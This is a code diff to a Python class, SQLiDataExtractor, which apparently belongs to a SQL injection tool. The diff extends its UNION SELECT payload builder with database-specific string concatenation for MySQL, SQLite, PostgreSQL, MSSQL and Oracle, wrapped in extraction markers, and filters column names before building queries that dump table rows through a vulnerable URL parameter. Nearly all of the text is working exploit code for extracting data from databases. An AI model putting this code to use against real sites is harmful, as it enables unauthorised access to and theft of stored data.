@@ -388,10 +388,24 @@ class SQLiDataExtractor:
         cols = []
         for i in range(self.num_columns):
             if i == self.injectable_index:
-                cols.append(f"CONCAT('{self._marker_tag}',({inner_query}),'{self._marker_tag}')")
+                cols.append(self._wrap_concat(inner_query))
             else:
                 cols.append('NULL')
         return f"{self.prefix} UNION SELECT {','.join(cols)}{self.suffix}"
+
+    def _wrap_concat(self, expr: str) -> str:
+        """Wrap *expr* in database-specific string concatenation with
+        the extraction markers."""
+        tag = self._marker_tag
+        if self.db_type in ('mysql', 'sqlite'):
+            return f"CONCAT('{tag}',({expr}),'{tag}')"
+        elif self.db_type == 'postgresql':
+            return f"'{tag}'||({expr})||'{tag}'"
+        elif self.db_type == 'mssql':
+            return f"'{tag}'+CAST(({expr}) AS VARCHAR)+'{tag}'"
+        elif self.db_type == 'oracle':
+            return f"'{tag}'||({expr})||'{tag}'"
+        return f"CONCAT('{tag}',({expr}),'{tag}')"
 
     def _send(self, url: str, param: str, payload: str):
         """Fire the payload and return the response text or ''."""
@@ -503,8 +517,23 @@ class SQLiDataExtractor:
         q = self._INFO_QUERIES.get(self.db_type, {}).get('rows', '')
         if not q or not columns:
             return []
-        cols_expr = ','.join(columns)
-        concat_expr = "CONCAT_WS(',', " + ','.join(columns) + ")"
+        # Sanitise column names – only allow alphanumeric + underscore
+        import re as _re
+        safe_cols = [c for c in columns if _re.fullmatch(r'[A-Za-z_]\w*', c)]
+        if not safe_cols:
+            return []
+        # Build DB-specific row concatenation
+        if self.db_type in ('mysql', 'sqlite'):
+            concat_expr = "CONCAT_WS(',', " + ','.join(safe_cols) + ")"
+        elif self.db_type == 'postgresql':
+            concat_expr = ' || \',\' || '.join(safe_cols)
+        elif self.db_type == 'mssql':
+            casts = [f"CAST({c} AS VARCHAR)" for c in safe_cols]
+            concat_expr = " + ',' + ".join(casts)
+        elif self.db_type == 'oracle':
+            concat_expr = " || ',' || ".join(safe_cols)
+        else:
+            concat_expr = "CONCAT_WS(',', " + ','.join(safe_cols) + ")"
         q = q.format(cols=concat_expr, db=db, table=table,
                      limit=limit, offset=offset)
         payload = self._build_union_payload(q)
@@ -514,7 +543,7 @@ class SQLiDataExtractor:
         for line in raw:
             parts = line.split(',')
             row = {}
-            for i, col in enumerate(columns):
+            for i, col in enumerate(safe_cols):
                 row[col] = parts[i] if i < len(parts) else ''
             rows.append(row)
         return rows
